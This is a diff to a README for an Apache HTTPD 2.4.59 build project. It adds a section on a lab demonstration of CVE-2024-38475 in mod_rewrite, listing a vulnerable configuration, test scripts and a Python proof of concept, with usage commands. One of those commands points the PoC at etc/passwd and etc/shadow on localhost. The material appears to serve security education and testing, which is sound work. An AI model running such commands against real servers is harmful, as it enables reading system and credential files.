@@ -46,6 +46,37 @@ This project includes an automated script to install Apache HTTPD 2.4.59 from so
 - **Document root:** `/usr/local/apache2/htdocs/`
 - **Start/Stop Apache:** `/usr/local/apache2/bin/apachectl {start|stop|restart}`
 
+#### CVE-2024-38475 Vulnerability Demonstration
+This project includes a complete demonstration of **CVE-2024-38475**, a critical vulnerability in Apache mod_rewrite:
+
+- **`vulnerable-httpd-2.4.59.conf`** - Vulnerable Apache configuration
+- **`cve-2024-38475-demo.sh`** - Vulnerability demonstration script  
+- **`test-cve-2024-38475.sh`** - Automated vulnerability testing
+- **`cve-2024-38475-poc.py`** - **Python PoC script for automated testing**
+- **`poc-examples.py`** - Interactive examples for using the Python PoC
+- **`requirements.txt`** - Python dependencies
+- **`CVE-2024-38475-README.md`** - Detailed vulnerability documentation
+
+**Python PoC Usage:**
+```bash
+# Install dependencies
+pip3 install -r requirements.txt
+
+# Basic test
+python3 cve-2024-38475-poc.py -u http://localhost
+
+# Verbose output with custom files
+python3 cve-2024-38475-poc.py -u http://localhost -v -f etc/passwd,etc/shadow
+
+# Generate detailed report
+python3 cve-2024-38475-poc.py -u http://localhost -o report.txt
+
+# Interactive examples
+python3 poc-examples.py
+```
+
+**⚠️ WARNING**: The vulnerability files are for educational purposes only. Never use in production!
+
 #### Troubleshooting
 - Ensure you have sudo privileges
 - Check that port 80 is not being used by another service
